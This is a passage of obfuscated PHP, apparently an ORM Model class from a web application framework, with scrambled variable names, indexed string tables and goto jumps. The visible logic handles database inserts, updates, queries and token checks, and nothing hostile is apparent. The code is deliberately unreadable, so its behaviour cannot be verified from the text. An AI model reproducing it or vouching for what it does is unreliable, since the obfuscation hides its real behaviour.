($šĞß Æ as $¯‚ÀÀî‡) { if (isset($¯‚ÀÀî‡[$³‡şÉô[1880]])) { $¯ĞÎİ[] = $¯‚ÀÀî‡[$³‡şÉô[1880]][$³‡şÉô[1870]]; } } $¥Í™©‘— = $this->metaList($¯ĞÎİ); if (!$¥Í™©‘—) { return !1; } foreach ($šĞß Æ as &$¯‚ÀÀî‡) { $¯‚ÀÀî‡[$³‡şÉô[475]] = $¥Í™©‘—[$¯‚ÀÀî‡[$³‡şÉô[1870]]]; if (isset($¯‚ÀÀî‡[$³‡şÉô[1880]])) { $¯‚ÀÀî‡[$³‡şÉô[1880]][$³‡şÉô[475]] = $¥Í™©‘—[$¯‚ÀÀî‡[$³‡şÉô[1880]][$³‡şÉô[1870]]]; } } unset($¯‚ÀÀî‡); } private function metaList($Ôã¯À¯‹) { $« ıÑ¢ =& $_SERVER[ïëó©ÒÚ]; if (!$Ôã¯À¯‹) { return array(); } $ª§ã²éÛ = array($« ıÑ¢[1870] => array($« ıÑ¢[7], $Ôã¯À¯‹)); $ƒôÉğÛ = Model($« ıÑ¢[1881])->where($ª§ã²éÛ)->select(); $ƒôÉğÛ = array_to_keyvalue_group($ƒôÉğÛ, $« ıÑ¢[1870]); foreach ($ƒôÉğÛ as $Óšä˜Ã => $ü§ÎÓˆó) { $ââ›‰¡Ï = array(); foreach ($ü§ÎÓˆó as $¬Õ‹‰¥Œ) { $ââ›‰¡Ï[$¬Õ‹‰¥Œ[$« ıÑ¢[94]]] = $¬Õ‹‰¥Œ[$« ıÑ¢[374]]; } $ƒôÉğÛ[$Óšä˜Ã] = $ââ›‰¡Ï; } return $ƒôÉğÛ ? $ƒôÉğÛ : array(); } } goto AÔ«Ş°ñŒ‰; aŠŸµ¶Ì¡ƒ: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\x62\154\x65", "\x6f\x72\x64\x65\x72", "\141\x6c\x69\141\x73", "\150\x61\x76\x69\156\147", "\147\162\x6f\x75\160", "\154\x6f\143\153", "\x64\151\163\x74\151\156\x63\x74", "\141\x75\x74\157", "\x66\151\x6c\164\x65\x72", "\x76\141\x6c\151\144\141\164\145", "\162\x65\163\165\x6c\x74", "\142\151\x6e\144", "\x74\157\153\x65\156"); public function __construct($ûµ¢œÛ = '', $¤Ì®¢ò = '', $ÓÖ‹å‰‚ = '') { $ô‡¢»Üã =& $_SERVER[ïëó©ÒÚ]; $this->_initialize(); if (!empty($ûµ¢œÛ)) { if (strpos($ûµ¢œÛ, $ô‡¢»Üã[10])) { list($this->dbName, $this->name) = explode($ô‡¢»Üã[10], $ûµ¢œÛ); } else { $this->name = $ûµ¢œÛ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($¤Ì®¢ò)) { $this->tablePrefix = $ô‡¢»Üã[12]; } elseif ($ô‡¢»Üã[12] != $¤Ì®¢ò) { $this->tablePrefix = $¤Ì®¢ò; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($ô‡¢»Üã[244]); } $this->db(0, empty($this->connection) ? $ÓÖ‹å‰‚ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $÷õØÖÅÖ =& $_SERVER[ïëó©ÒÚ]; if (empty($this->fields)) { if (think_config($÷õØÖÅÖ[245])) { $“ú—´óƒ = $this->dbName ? $this->dbName : think_config($÷õØÖÅÖ[246]); $²½Šø = think_var_cache($÷õØÖÅÖ[247] . strtolower(get_path_this($“ú—´óƒ) . $÷õØÖÅÖ[10] . $this->name)); if ($²½Šø) { $Åˆ­ß¶¥ = think_config($÷õØÖÅÖ[248]); if (empty($Åˆ­ß¶¥) || $²½Šø[$÷õØÖÅÖ[249]] == $Åˆ­ß¶¥) { $this->fields = $²½Šø; return; } } } $this->flush(); } } public function flush() { $µ³íŒˆ =& $_SERVER[ïëó©ÒÚ]; $this->db->setModel($this->name); $ãÖ÷åò  = $this->db->getFields($this->getTableName()); if (!$ãÖ÷åò ) { return !1; } $this->fields = array_keys($ãÖ÷åò ); $this->fields[$µ³íŒˆ[250]] = !1; foreach ($ãÖ÷åò  as $ÚÔ›ºÚ => $üÙÎõÙ¦) { $à¡ôš×¥[$ÚÔ›ºÚ] = $üÙÎõÙ¦[$µ³íŒˆ[33]]; if ($üÙÎõÙ¦[$µ³íŒˆ[39]]) { $this->fields[$µ³íŒˆ[251]] = $ÚÔ›ºÚ; if ($üÙÎõÙ¦[$µ³íŒˆ[42]]) { $this->fields[$µ³íŒˆ[250]] = !0; } } } $this->fields[$µ³íŒˆ[252]] = $à¡ôš×¥; if (think_config($µ³íŒˆ[248])) { $this->fields[$µ³íŒˆ[249]] = think_config($µ³íŒˆ[248]); } if (think_config($µ³íŒˆ[245])) { $Î²ÍöüÈ = $this->dbName ? $this->dbName : think_config($µ³íŒˆ[246]); think_var_cache($µ³íŒˆ[247] . strtolower(get_path_this($Î²ÍöüÈ) . $µ³íŒˆ[10] . $this->name), $this->fields); } } public function switchModel($ÓÃğãÓ¬, $Ñ¾Îõ±û = array()) { $øü§§Ÿ =& $_SERVER[ïëó©ÒÚ]; $‚Ùœøü¿ = ucwords(strtolower($ÓÃğãÓ¬)) . $øü§§Ÿ[253]; if (!class_exists($‚Ùœøü¿)) { think_exception($‚Ùœøü¿ . think_lang($øü§§Ÿ[254])); } $this->_extModel = new $‚Ùœøü¿($this->name); if (!empty($Ñ¾Îõ±û)) { foreach ($Ñ¾Îõ±û as $ûÚ½£„ ) { $this->_extModel->setProperty($ûÚ½£„ , $this->{$ûÚ½£„ }); } } return $this->_extModel; } public function __set($ó°âß¯Â, $­÷·œğ) { $this->data[$ó°âß¯Â] = $­÷·œğ; } public function __get($Æ¬í“) { return isset($this->data[$Æ¬í“]) ? $this->data[$Æ¬í“] : null; } public function __isset($º•Ø¾÷‹) { return isset($this->data[$º•Ø¾÷‹]); } public function __unset($şàøñŠ‡) { unset($this->data[$şàøñŠ‡]); } public function __call($‹Ìê•–Á, $éÈµèó£) { $ÖºêÅ€¤ =& $_SERVER[ïëó©ÒÚ]; if (in_array(strtolower($‹Ìê•–Á), $this->methods, !0)) { $this->options[strtolower($‹Ìê•–Á)] = $éÈµèó£[0]; return $this; } elseif (in_array(strtolower($‹Ìê•–Á), array($ÖºêÅ€¤[255], $ÖºêÅ€¤[256], $ÖºêÅ€¤[257], $ÖºêÅ€¤[258], $ÖºêÅ€¤[259]), !0)) { $ÒŞÁØ¢Õ = isset($éÈµèó£[0]) ? $éÈµèó£[0] : $ÖºêÅ€¤[188]; $ÒŞÁØ¢Õ = $this->db->parseKey($ÒŞÁØ¢Õ); return $this->getField(strtoupper($‹Ìê•–Á) . $ÖºêÅ€¤[260] . $ÒŞÁØ¢Õ . $ÖºêÅ€¤[261] . $‹Ìê•–Á, $ÖºêÅ€¤[255]); } elseif (strtolower(substr($‹Ìê•–Á, 0, 5)) == $ÖºêÅ€¤[262]) { $ÒŞÁØ¢Õ = think_parse_name(substr($‹Ìê•–Á, 5)); $­ç÷àº´[$ÒŞÁØ¢Õ] = $éÈµèó£[0]; return $this->where($­ç÷àº´)->find(); } elseif (strtolower(substr($‹Ìê•–Á, 0, 10)) == $ÖºêÅ€¤[263]) { $±«Îó–á = think_parse_name(substr($‹Ìê•–Á, 10)); $­ç÷àº´[$±«Îó–á] = $éÈµèó£[0]; return $this->where($­ç÷àº´)->getField($éÈµèó£[1]); } elseif (isset($this->_scope[$‹Ìê•–Á])) { return $this->scope($‹Ìê•–Á, $éÈµèó£[0]); } elseif (method_exists($this, $‹Ìê•–Á)) { array_unshift($éÈµèó£, $‹Ìê•–Á); return call_user_func_array(array($this, $ÖºêÅ€¤[264]), $éÈµèó£); } else { return call_user_func_array(array(parent, $‹Ìê•–Á), $éÈµèó£); } } protected function call() { $Ó¿¢ü‘™ =& $_SERVER[ïëó©ÒÚ]; $Î†•“íÆ = func_get_args(); $¼ı¼ ¨ = array_shift($Î†•“íÆ); $ªŒ»¸Î¥ = $¼ı¼ ¨; if (is_array($¼ı¼ ¨)) { $ªŒ»¸Î¥ = $¼ı¼ ¨[1]; $¼ı¼ ¨ = $¼ı¼ ¨[0]; } $Í÷‡÷Ê = count($Î†•“íÆ) - 1; if (isset($Î†•“íÆ[$Í÷‡÷Ê]) && $Î†•“íÆ[$Í÷‡÷Ê] === $¼ı¼ ¨) { think_exception(__CLASS__ . $Ó¿¢ü‘™[4] . $¼ı¼ ¨ . think_lang($Ó¿¢ü‘™[265])); return; } $Î†•“íÆ[] = $¼ı¼ ¨; if (method_exists($this, $Ó¿¢ü‘™[266])) { $Éš…¾á“ = call_user_func_array(array($this, $Ó¿¢ü‘™[267]), array($ªŒ»¸Î¥, $Î†•“íÆ)); if (!is_null($Éš…¾á“) && $Éš…¾á“ !== !1) { return $Éš…¾á“; } } $«¢úıŸÍ = call_user_func_array(array($this, $¼ı¼ ¨), $Î†•“íÆ); if (method_exists($this, $Ó¿¢ü‘™[268])) { $Éš…¾á“ = call_user_func_array(array($this, $Ó¿¢ü‘™[269]), array($ªŒ»¸Î¥, $Î†•“íÆ, $«¢úıŸÍ)); if ($Éš…¾á“) { return $Éš…¾á“; } } return $«¢úıŸÍ; } protected function _initialize() { } protected function _facade($œ½ÕÌĞ°) { $ºŞ¡àá¡ =& $_SERVER[ïëó©ÒÚ]; if (!empty($this->fields)) { foreach ($œ½ÕÌĞ° as $Œ©´Òòã => $²¨Ì¨ÊË) { if (is_array($this->fields) && !in_array($Œ©´Òòã, $this->fields, !0)) { unset($œ½ÕÌĞ°[$Œ©´Òòã]); } elseif (is_scalar($²¨Ì¨ÊË)) { $this->_parseType($œ½ÕÌĞ°, $Œ©´Òòã); } } } if (!empty($this->options[$ºŞ¡àá¡[270]])) { $œ½ÕÌĞ° = array_map($this->options[$ºŞ¡àá¡[270]], $œ½ÕÌĞ°); unset($this->options[$ºŞ¡àá¡[270]]); } $this->_beforeWrite($œ½ÕÌĞ°); return $œ½ÕÌĞ°; } protected function _beforeWrite(&$ôœìÀœ‰) { } public function add($‰šÁ–‚ = '', $ê±Øåêí = array(), $ôÌ„ª±ª = false) { if (empty($‰šÁ–‚)) { if (!empty($this->data)) { $‰šÁ–‚ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ïëó©ÒÚ][271]); return !1; } } $ê±Øåêí = $this->_parseOptions($ê±Øåêí); $‰šÁ–‚ = $this->_facade($‰šÁ–‚); if (!1 === $this->_beforeInsert($‰šÁ–‚, $ê±Øåêí)) { return !1; } $ºƒ´çŸ = $this->db->insert($‰šÁ–‚, $ê±Øåêí, $ôÌ„ª±ª); if (!1 !== $ºƒ´çŸ) { $¥œ«ÙœŒ = $this->getLastInsID(); if ($¥œ«ÙœŒ) { $‰šÁ–‚[$this->getPk()] = $¥œ«ÙœŒ; $this->_after_insert($‰šÁ–‚, $ê±Øåêí); return $¥œ«ÙœŒ; } $this->_after_insert($‰šÁ–‚, $ê±Øåêí); } return $ºƒ´çŸ; } protected function _beforeInsert(&$â¾”Â…Å, $ã·ğ×) { } protected function _after_insert($ğÇ‰úóù, $·ÅËæû¿) { } public function addAll($ş‡«•è…, $‹å—´¥à = array(), $”Ÿ«²ÅØ = false) { $Â‘ñËØ’ =& $_SERVER[ïëó©ÒÚ]; if (empty($ş‡«•è…)) { $this->error = think_lang($Â‘ñËØ’[271]); return !1; } $‹å—´¥à = $this->_parseOptions($‹å—´¥à); foreach ($ş‡«•è… as $¢óÀÔ => $ÍÍ·ì£‡) { $ş‡«•è…[$¢óÀÔ] = $this->_facade($ÍÍ·ì£‡); } if (method_exists($this->db, $Â‘ñËØ’[272])) { $„úÓ±—¸ = $this->db->insertAll($ş‡«•è…, $‹å—´¥à, $”Ÿ«²ÅØ); } else { $this->startTrans(); foreach ($ş‡«•è… as $¢óÀÔ => $ÍÍ·ì£‡) { $„úÓ±—¸ = $this->db->insert($ÍÍ·ì£‡, $‹å—´¥à, $”Ÿ«²ÅØ); } $this->commit(); } if (!1 !== $„úÓ±—¸) { $É¾®îû = $this->getLastInsID(); if ($É¾®îû) { return $É¾®îû; } } return $„úÓ±—¸; } public function selectAdd($’¢áòä– = '', $ºèşÃîŞ = '', $û˜ò€·´ = array()) { $äØÄíÇ =& $_SERVER[ïëó©ÒÚ]; $û˜ò€·´ = $this->_parseOptions($û˜ò€·´); if (!1 === ($³ˆ¼Š¼Ú = $this->db->selectInsert($’¢áòä– ? $’¢áòä– : $û˜ò€·´[$äØÄíÇ[273]], $ºèşÃîŞ ? $ºèşÃîŞ : $this->getTableName(), $û˜ò€·´))) { $this->error = think_lang($äØÄíÇ[274]); return !1; } else { return $³ˆ¼Š¼Ú; } } public function save($üÃ÷Â…ú = '', $°ŞÌ¤æ¹ = array()) { $Ìü³ª—Ú =& $_SERVER[ïëó©ÒÚ]; if (empty($üÃ÷Â…ú)) { if (!empty($this->data)) { $üÃ÷Â…ú = $this->data; $this->data = array(); } else { $this->error = think_lang($Ìü³ª—Ú[271]); return !1; } } $üÃ÷Â…ú = $this->_facade($üÃ÷Â…ú); $°ŞÌ¤æ¹ = $this->_parseOptions($°ŞÌ¤æ¹); $´§Ä¥®ñ = $this->getPk(); if (!isset($°ŞÌ¤æ¹[$Ìü³ª—Ú[275]])) { if (isset($üÃ÷Â…ú[$´§Ä¥®ñ])) { $İå¿š[$´§Ä¥®ñ] = $üÃ÷Â…ú[$´§Ä¥®ñ]; $°ŞÌ¤æ¹[$Ìü³ª—Ú[275]] = $İå¿š; unset($üÃ÷Â…ú[$´§Ä¥®ñ]); } else { $this->error = think_lang($Ìü³ª—Ú[274]); return !1; } } if (is_array($°ŞÌ¤æ¹[$Ìü³ª—Ú[275]]) && isset($°ŞÌ¤æ¹[$Ìü³ª—Ú[275]][$´§Ä¥®ñ])) { $µÕôş¼ç = $°ŞÌ¤æ¹[$Ìü³ª—Ú[275]][$´§Ä¥®ñ]; } if (!1 === $this->_beforeUpdate($üÃ÷Â…ú, $°ŞÌ¤æ¹)) { return !1; } $‘õ„å®„ = $this->db->update($üÃ÷Â…ú, $°ŞÌ¤æ¹); if (!1 !== $‘õ„å®„) { if (isset($µÕôş¼ç)) { $üÃ÷Â…ú[$´§Ä¥®ñ] = $µÕôş¼ç; } $this->_afterUpdate($üÃ÷Â…ú, $°ŞÌ¤æ¹); } return $‘õ„å®„; } protected function _beforeUpdate(&$¥¨ÅŞÚ, $«™’—Õû) { } protected function _afterUpdate($¹®Õƒ‚©, $ªøÉÖê¾) { } public function delete($Èøôãã° = array()) { $Ã›ÛŸç =& $_SERVER[ïëó©ÒÚ]; if (empty($Èøôãã°) && empty($this->options[$Ã›ÛŸç[275]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $¶Ÿºæœú = $this->getPk(); if (is_numeric($Èøôãã°) || is_string($Èøôãã°)) { if (strpos($Èøôãã°, $Ã›ÛŸç[50])) { $Ù¦Òú¾[$¶Ÿºæœú] = array($Ã›ÛŸç[276], $Èøôãã°); } else { $Ù¦Òú¾[$¶Ÿºæœú] = $Èøôãã°; } $this->options[$Ã›ÛŸç[275]] = $Ù¦Òú¾; } $Èøôãã° = $this->_parseOptions(); if (is_array($Èøôãã°[$Ã›ÛŸç[275]]) && isset($Èøôãã°[$Ã›ÛŸç[275]][$¶Ÿºæœú])) { $š‹Åõì = $Èøôãã°[$Ã›ÛŸç[275]][$¶Ÿºæœú]; } $®»´­ÚÂ = $this->db->delete($Èøôãã°); if (!1 !== $®»´­ÚÂ) { $Èƒœï³ó = array(); if (isset($š‹Åõì)) { $Èƒœï³ó[$¶Ÿºæœú] = $š‹Åõì; } $this->_after_delete($Èƒœï³ó, $Èøôãã°); } return $®»´­ÚÂ; } protected function _after_delete($ıËÚ„ŞÀ, $¬ÛİƒÅŠ) { } public function select($µòÙ—±“ = array()) { $ø›óÊà› =& $_SERVER[ïëó©ÒÚ]; if (is_string($µòÙ—±“) || is_numeric($µòÙ—±“)) { $ÑÃ ¡‰• = $this->getPk(); if (strpos($µòÙ—±“, $ø›óÊà›[50])) { $ÑŸ›‰[$ÑÃ ¡‰•] = array($ø›óÊà›[276], $µòÙ—±“); } else { $ÑŸ›‰[$ÑÃ ¡‰•] = $µòÙ—±“; } $this->options[$ø›óÊà›[275]] = $ÑŸ›‰; } elseif (!1 === $µòÙ—±“) { $µòÙ—±“ = $this->_parseOptions(); return $ø›óÊà›[277] . $this->db->buildSelectSql($µòÙ—±“) . $ø›óÊà›[278]; } $µòÙ—±“ = $this->_parseOptions(); $ÆûïÖÁÜ = $this->db->select($µòÙ—±“); if (!1 === $ÆûïÖÁÜ) { return !1; } if (empty($ÆûïÖÁÜ)) { return null; } $this->_afterSelect($ÆûïÖÁÜ, $µòÙ—±“); return $ÆûïÖÁÜ; } protected function _afterSelect(&$ÛÙË´, $Êîç×ôÏ) { } public function buildSql($øµÀœà€ = array()) { $õÖô¬´ =& $_SERVER[ïëó©ÒÚ]; $øµÀœà€ = $this->_parseOptions($øµÀœà€); return $õÖô¬´[277] . $this->db->buildSelectSql($øµÀœà€) . $õÖô¬´[278]; } public function optionsValue($âøÂ”˜ = null) { if (is_null($âøÂ”˜)) { return $this->options; } elseif (is_array($âøÂ”˜)) { $this->options = array_merge($this->options, $âøÂ”˜); } } protected function _parseOptions($¹Ëº£¼ = array()) { $‹ù‰öşç =& $_SERVER[ïëó©ÒÚ]; if (is_array($¹Ëº£¼)) { $¹Ëº£¼ = array_merge($this->options, $¹Ëº£¼); } $this->options = array(); if (!isset($¹Ëº£¼[$‹ù‰öşç[279]])) { $¹Ëº£¼[$‹ù‰öşç[279]] = $this->getTableName(); $¼ÜêËôè = $this->fields; } else { $¼ÜêËôè = $this->getDbFields(); } if (!empty($¹Ëº£¼[$‹ù‰öşç[280]])) { $¹Ëº£¼[$‹ù‰öşç[279]] .= $‹ù‰öşç[53] . $¹Ëº£¼[$‹ù‰öşç[280]]; } $¹Ëº£¼[$‹ù‰öşç[281]] = $this->name; if (isset($¹Ëº£¼[$‹ù‰öşç[275]]) && is_array($¹Ëº£¼[$‹ù‰öşç[275]]) && !empty($¼ÜêËôè) && !isset($¹Ëº£¼[$‹ù‰öşç[282]]) && !isset($¹Ëº£¼[$‹ù‰öşç[279]])) { foreach ($¹Ëº£¼[$‹ù‰öşç[275]] as $Ø®ƒï†Ê => $ëÄè¶Á) { $Ø®ƒï†Ê = trim($Ø®ƒï†Ê); if (in_array($Ø®ƒï†Ê, $¼ÜêËôè, !0)) { if (is_scalar($ëÄè¶Á)) { $this->_parseType($¹Ëº£¼[$‹ù‰öşç[275]], $Ø®ƒï†Ê); } } elseif (!is_numeric($Ø®ƒï†Ê) && $‹ù‰öşç[11] != substr($Ø®ƒï†Ê, 0, 1) && !1 === strpos($Ø®ƒï†Ê, $‹ù‰öşç[10]) && !1 === strpos($Ø®ƒï†Ê, $‹ù‰öşç[260]) && !1 === strpos($Ø®ƒï†Ê, $‹ù‰öşç[283]) && !1 === strpos($Ø®ƒï†Ê, $‹ù‰öşç[284])) { unset($¹Ëº£¼[$‹ù‰öşç[275]][$Ø®ƒï†Ê]); } } } $this->_options_filter($¹Ëº£¼); return $¹Ëº£¼; } protected function _options_filter(&$–åáàŠÑ) { } protected function _parseType(&$Í÷ìŠ¤, $ÏÌÃ«Ñ˜) { $¾Ûˆ—ˆí =& $_SERVER[ïëó©ÒÚ]; if (empty($this->options[$¾Ûˆ—ˆí[285]][$¾Ûˆ—ˆí[4] . $ÏÌÃ«Ñ˜])) { $¤£õÓş€ = strtolower($this->fields[$¾Ûˆ—ˆí[252]][$ÏÌÃ«Ñ˜]); if (!1 !== strpos($¤£õÓş€, $¾Ûˆ—ˆí[286])) { } elseif (!1 === strpos($¤£õÓş€, $¾Ûˆ—ˆí[287]) && !1 !== strpos($¤£õÓş€, $¾Ûˆ—ˆí[288])) { $Í÷ìŠ¤[$ÏÌÃ«Ñ˜] = intval($Í÷ìŠ¤[$ÏÌÃ«Ñ˜]); } elseif (!1 !== strpos($¤£õÓş€, $¾Ûˆ—ˆí[289]) || !1 !== strpos($¤£õÓş€, $¾Ûˆ—ˆí[290])) { $Í÷ìŠ¤[$ÏÌÃ«Ñ˜] = floatval($Í÷ìŠ¤[$ÏÌÃ«Ñ˜]); } elseif (!1 !== strpos($¤£õÓş€, $¾Ûˆ—ˆí[291])) { $Í÷ìŠ¤[$ÏÌÃ«Ñ˜] = (bool) $Í÷ìŠ¤[$ÏÌÃ«Ñ˜]; } } } public function find($å¯Àú— = array()) { $áÈüŠ“º =& $_SERVER[ïëó©ÒÚ]; if (is_numeric($å¯Àú—) || is_string($å¯Àú—)) { $“˜à˜İ²[$this->getPk()] = intval($å¯Àú—); $this->options[$áÈüŠ“º[275]] = $“˜à˜İ²; } $this->options[$áÈüŠ“º[292]] = 1; $å¯Àú— = $this->_parseOptions(); $Í—¥ÖÀ“ = $this->db->select($å¯Àú—); if (!1 === $Í—¥ÖÀ“) { return !1; } if (empty($Í—¥ÖÀ“)) { return null; } $this->data = $Í—¥ÖÀ“[0]; $this->_afterFind($this->data, $å¯Àú—); if (!empty($this->options[$áÈüŠ“º[293]])) { return $this->returnResult($this->data, $this->options[$áÈüŠ“º[293]]); } return $this->data; } protected function _afterFind(&$†ØˆŒõ‚, $›Ã’£ªĞ) { } protected function returnResult($°òôÛì´, $»öä¢øˆ = '') { $ò½œşû =& $_SERVER[ïëó©ÒÚ]; if ($»öä¢øˆ) { if (is_callable($»öä¢øˆ)) { return call_user_func($»öä¢øˆ, $°òôÛì´); } switch (strtolower($»öä¢øˆ)) { case $ò½œşû[294]: return json_encode($°òôÛì´); case $ò½œşû[295]: return xml_encode($°òôÛì´); } } return $°òôÛì´; } public function parseFieldsMap($Ä†İª…é, $Å¯åªË = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ù‘–óĞ× => $¹‡º¦Ô…) { if ($Å¯åªË == 1) { if (isset($Ä†İª…é[$¹‡º¦Ô…])) { $Ä†İª…é[$ù‘–óĞ×] = $Ä†İª…é[$¹‡º¦Ô…]; unset($Ä†İª…é[$¹‡º¦Ô…]); } } else { if (isset($Ä†İª…é[$ù‘–óĞ×])) { $Ä†İª…é[$¹‡º¦Ô…] = $Ä†İª…é[$ù‘–óĞ×]; unset($Ä†İª…é[$ù‘–óĞ×]); } } } } return $Ä†İª…é; } public function setField($¤®ãÒŞØ, $ìÉæÔÎÂ = '') { if (is_array($¤®ãÒŞØ)) { $Ú¯¦»é = $¤®ãÒŞØ; } else { $Ú¯¦»é[$¤®ãÒŞØ] = $ìÉæÔÎÂ; } return $this->save($Ú¯¦»é); } public function setAdd($ºÄ‘ªÕé, $êâ‰äØˆ = 1) { $†Àººõ° =& $_SERVER[ïëó©ÒÚ]; $ÏóıÇ¦ = $ºÄ‘ªÕé . $†Àººõ°[296] . $êâ‰äØˆ; if ($êâ‰äØˆ < 0) { $ÏóıÇ¦ = $ºÄ‘ªÕé . $êâ‰äØˆ; } return $this->setField($ºÄ‘ªÕé, array($†Àººõ°[297], $ÏóıÇ¦)); } public function getField($ñóñ¥£å, $Ååª·â­ = null) { $ıµ»ğ‹ =& $_SERVER[ïëó©ÒÚ]; $ÓØóş•ã[$ıµ»ğ‹[273]] = $ñóñ¥£å; $ÓØóş•ã = $this->_parseOptions($ÓØóş•ã); $ñóñ¥£å = trim($ñóñ¥£å); if (strpos($ñóñ¥£å, $ıµ»ğ‹[50])) { if (!isset($ÓØóş•ã[$ıµ»ğ‹[292]])) { $ÓØóş•ã[$ıµ»ğ‹[292]] = is_numeric($Ååª·â­) ? $Ååª·â­ : $ıµ»ğ‹[12]; } $Ù‰ŞÉÁ = $this->db->select($ÓØóş•ã); if (!empty($Ù‰ŞÉÁ)) { $ë²‚Î÷ñ = explode($ıµ»ğ‹[50], $ñóñ¥£å); $ñóñ¥£å = array_keys($Ù‰ŞÉÁ[0]); $½«™¤§› = array_shift($ñóñ¥£å); $Á†Æğ¦ş = array_shift($ñóñ¥£å); $ÎÆÓ‚Àì = array(); $¨ÄÖó«ß = count($ë²‚Î÷ñ); foreach ($Ù‰ŞÉÁ as $«×€ê–) { $Ë€·¤ó¿ = $«×€ê–[$½«™¤§›]; if (2 == $¨ÄÖó«ß) { $ÎÆÓ‚Àì[$Ë€·¤ó¿] = $«×€ê–[$Á†Æğ¦ş]; } else { $ÎÆÓ‚Àì[$Ë€·¤ó¿] = is_string($Ååª·â­) ? implode($Ååª·â­, $«×€ê–) : $«×€ê–; } } return $ÎÆÓ‚Àì; } } else { if (!0 !== $Ååª·â­) { $ÓØóş•ã[$ıµ»ğ‹[292]] = is_numeric($Ååª·â­) ? $Ååª·â­ : 1; } if ($Ååª·â­ === $ıµ»ğ‹[255]) { unset($ÓØóş•ã[$ıµ»ğ‹[292]]); } $«×€ê– = $this->db->select($ÓØóş•ã); if (!empty($«×€ê–)) { if ($Ååª·â­ === $ıµ»ğ‹[255]) { return reset($«×€ê–[0]); } if (!0 !== $Ååª·â­ && 1 == $ÓØóş•ã[$ıµ»ğ‹[292]]) { return reset($«×€ê–[0]); } foreach ($«×€ê– as $¤€íÛóµ) { $Á›³¸ñò[] = $¤€íÛóµ[$ñóñ¥£å]; } return $Á›³¸ñò; } } return null; } public function create($²Ü½Òİó = '', $‘‚¿Ü€É = '') { $­²ï™Á˜ =& $_SERVER[ïëó©ÒÚ]; if (empty($²Ü½Òİó)) { $²Ü½Òİó = $_POST; } elseif (is_object($²Ü½Òİó)) { $²Ü½Òİó = get_object_vars($²Ü½Òİó); } if (empty($²Ü½Òİó) || !is_array($²Ü½Òİó)) { $this->error = think_lang($­²ï™Á˜[271]); return !1; } $²Ü½Òİó = $this->parseFieldsMap($²Ü½Òİó, 0); $‘‚¿Ü€É = $‘‚¿Ü€É ? $‘‚¿Ü€É : (!empty($²Ü½Òİó[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$­²ï™Á˜[273]])) { $…±é‘Æ¿ = $this->options[$­²ï™Á˜[273]]; unset($this->options[$­²ï™Á˜[273]]); } elseif ($‘‚¿Ü€É == THINK_MODEL_INSERT && isset($this->insertFields)) { $…±é‘Æ¿ = $this->insertFields; } elseif ($‘‚¿Ü€É == THINK_MODEL_UPDATE && isset($this->updateFields)) { $…±é‘Æ¿ = $this->updateFields; } if (isset($…±é‘Æ¿)) { if (is_string($…±é‘Æ¿)) { $…±é‘Æ¿ = explode($­²ï™Á˜[50], $…±é‘Æ¿); } if (think_config($­²ï™Á˜[298])) { $…±é‘Æ¿[] = think_config($­²ï™Á˜[299]); } foreach ($²Ü½Òİó as $ø“Ò¯« => $”¹¥úØî) { if (!in_array($ø“Ò¯«, $…±é‘Æ¿)) { unset($²Ü½Òİó[$ø“Ò¯«]); } } } if (!$this->autoValidation($²Ü½Òİó, $‘‚¿Ü€É)) { return !1; } if (!$this->autoCheckToken($²Ü½Òİó)) { $this->error = think_lang($­²ï™Á˜[300]); return !1; } if ($this->autoCheckFields) { $…±é‘Æ¿ = $this->getDbFields(); foreach ($²Ü½Òİó as $ø“Ò¯« => $”¹¥úØî) { if (!in_array($ø“Ò¯«, $…±é‘Æ¿)) { unset($²Ü½Òİó[$ø“Ò¯«]); } elseif (MAGIC_QUOTES_GPC && is_string($”¹¥úØî)) { $²Ü½Òİó[$ø“Ò¯«] = stripslashes($”¹¥úØî); } } } $this->autoOperation($²Ü½Òİó, $‘‚¿Ü€É); $this->data = $²Ü½Òİó; return $²Ü½Òİó; } public function autoCheckToken($š×Í¾Ûö) { $‰ÅÄöû¹ =& $_SERVER[ïëó©ÒÚ]; if (isset($this->options[$‰ÅÄöû¹[301]]) && !$this->options[$‰ÅÄöû¹[301]]) { return !0; } if (think_config($‰ÅÄöû¹[298])) { $ã…šŸÒ = think_config($‰ÅÄöû¹[299]); if (!isset($š×Í¾Ûö[$ã…šŸÒ]) || Session::get($ã…šŸÒ)) { return !1; } list($Öøóä´Õ, $¾ë‹™©•) = explode($‰ÅÄöû¹[11], $š×Í¾Ûö[$ã…šŸÒ]); if ($¾ë‹™©• && Session::get($ã…šŸÒ . $‰ÅÄöû¹[10] . $Öøóä´Õ) === $¾ë‹™©•) { Session::remove($ã…šŸÒ . $‰ÅÄöû¹[10] . $Öøóä´Õ); return !0; } if (think_config($‰ÅÄöû¹[302])) { Session::remove($ã…šŸÒ . $‰ÅÄöû¹[10] . $Öøóä´Õ); } return !1; } return !0; } public function regex($Œù…ü¨˜, $åíÍ÷À) { $ë©­¢´ë =& $_SERVER[ïëó©ÒÚ]; $œÜâ¨‘Ñ = array($ë©­¢´ë[303] => $ë©­¢´ë[304], $ë©­¢´ë[305] => $ë©­¢´ë[306], $ë©­¢´ë[307] => $ë©­¢´ë[308], $ë©­¢´ë[309] => $ë©­¢´ë[310], $ë©­¢´ë[311] => $ë©­¢´ë[312], $ë©­¢´ë[313] => $ë©­¢´ë[314], $ë©­¢´ë[315] => $ë©­¢´ë[316], $ë©­¢´ë[290] => $ë©­¢´ë[317], $ë©­¢´ë[318] => $ë©­¢´ë[319]); if (isset($œÜâ¨‘Ñ[strtolower($åíÍ÷À)])) { $åíÍ÷À = $œÜâ¨‘Ñ[strtolower($åíÍ÷À)]; } return preg_match($åíÍ÷À, $Œù…ü¨˜) === 1; } private function autoOperation(&$íã­ØÂ’, 